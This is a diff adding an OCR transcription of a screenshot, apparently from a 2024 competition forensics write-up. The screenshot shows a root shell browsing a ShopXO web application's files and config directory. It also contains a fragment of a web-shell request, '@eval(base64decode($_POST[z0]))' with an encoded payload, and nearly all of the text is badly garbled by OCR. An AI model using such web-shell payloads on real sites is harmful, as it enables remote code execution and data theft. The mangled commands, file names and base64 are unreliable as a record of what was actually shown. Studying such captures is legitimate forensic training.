@@ -1,0 +1,50 @@
+# OCR: 5f7646546478e3b69fb94748854526f2.jpg
+# 来源: ./02-WriteUp/2024/2024-精武杯-比武/5f7646546478e3b69fb94748854526f2.jpg
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:19
+
+[root@server~]#cd/data[root@serverdata]#ls
+2e23.cnbackup
+ast+found
+[root@serverdata]#cd2e23.cn][root@server2e23.cn#1s
+404htl
+api.phpchangelog.txt
+admin.phpapp
+composer-json
+[root@server2e23.cn]#cd config][root@serverconfigi#Ls
+app.php
+composer.lock config
+exanple.env extend
+index.php install.php
+console-phpdatabase-php
+Lang-phpmiddleware.php
+filesysten.phplog.php
+cache.phpcookie.php
+[root@server configj# cat database-php
+route-php
+LICENSE txt publlo
+README.md esources
+session.php
+shopxo.sql
+shopxo.php
+trace.php
+Fsakeys Funttme
+ueditor-php
+1=@eval(base64decode(sPoST[ze1))-&ze-JTNDp3BocCUwOS8vJTIwKyetLSetLSetLSetLSetLSetLSetLSet
+LSetLSetLSetLSetLSetLSeUMEEvLyUyMcU3OyUyMFNob3BY
+CQSVBNeIyQyVFNSU4NSU4RCVFOCVCNCVCOSVFI etLSetLSetLSotLSotLSetLSetl
+iA50SUvMGhed satsat
+MUMMVENSSO
+VOROVE
+SeSat
+4NS40
+sourcecode think
+vendor
+SetSetsa
+Set
+SVFNCVCOCU5QSVFNyV
+KvetsetlSetls
+KSUN
+MME+
+SetLSot taxotbg
+S8V Sat
